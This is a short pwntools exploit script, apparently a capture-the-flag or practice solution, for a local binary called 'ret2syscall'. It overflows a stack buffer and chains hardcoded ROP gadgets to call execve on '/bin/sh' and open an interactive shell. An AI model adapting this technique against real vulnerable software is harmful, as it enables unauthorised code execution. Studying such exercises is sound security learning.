from pwn import *

p = process("./ret2syscall")

pop_rax_ret_addr = 0x40117E
pop_rdi_ret_addr = 0x401180
pop_rsi_rdx_ret_addr = 0x401182
syscall_addr = 0x401185
binsh_addr = 0x404040

payload = b"a" * 64 + b"b" * 8
payload += p64(pop_rax_ret_addr) + p64(59) 
payload += p64(pop_rdi_ret_addr) + p64(binsh_addr) 
payload += p64(pop_rsi_rdx_ret_addr) + p64(0) + p64(0) + p64(syscall_addr)
p.send(payload)


p.interactive()

